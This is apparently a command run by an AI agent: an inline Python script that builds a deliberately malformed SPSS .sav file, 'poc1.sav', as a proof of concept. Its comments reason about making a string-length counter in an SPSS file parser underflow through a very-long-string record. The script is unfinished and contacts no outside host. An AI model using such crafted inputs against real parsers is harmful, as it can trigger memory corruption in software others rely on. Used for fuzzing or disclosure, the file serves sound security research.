Running command: cd /workspace && python3 - <<'PY'
import struct, pathlib
p=pathlib.Path('/workspace/poc1.sav')
# header 176 bytes
rec_type=b'$FL2'
prod=b'@(#) IBM SPSS STATISTICS'.ljust(60,b' ')
layout=2
nominal=1
compression=0
weight=0
ncases=1
bias=100.0
creation_date=b'01 JAN 24'
creation_time=b'00:00:00'
file_label=b''.ljust(64,b' ')
padding=b'   '
header=struct.pack('<4s60siiii d 9s8s64s3s',rec_type,prod,layout,nominal,compression,weight,ncases,bias,creation_date,creation_time,file_label,padding)
assert len(header)==176
out=bytearray(header)
def i(x): return struct.pack('<i',x)
def u(x): return struct.pack('<I',x)
# variable record: record type 2 then type=1 string variable, no label missing, print/write A1 (type 1 width 1 dec 0 => 0x00010100?)
out += i(2)
out += struct.pack('<iiiii8s',1,0,0,0x00010100,0x00010100,b'V1      ')
# integer info subtype 3, size 4, count 8
out += i(7)+i(3)+i(4)+i(8)
# version major/minor/rev,machine,floating,compression_code,endianness,charcode
out += struct.pack('<iiiiiiii',20,0,0,-1,1,0,2,65001)
# very long string record subtype 14, size 1, count len
v=b'V1=253'
out += i(7)+i(14)+i(1)+i(len(v))+v
# dictionary termination
out += i(999)+i(0)
# one uncompressed row: var_offset=1 -> 8 bytes; since col_info.width=1 and n_segments=2, raw_str_used decremented from 8 to 7 not underflow. Need col_info.width=0? hmm
out += b'ABCDEFGH'
p.write_bytes(out)
print(len(out), p)
PY
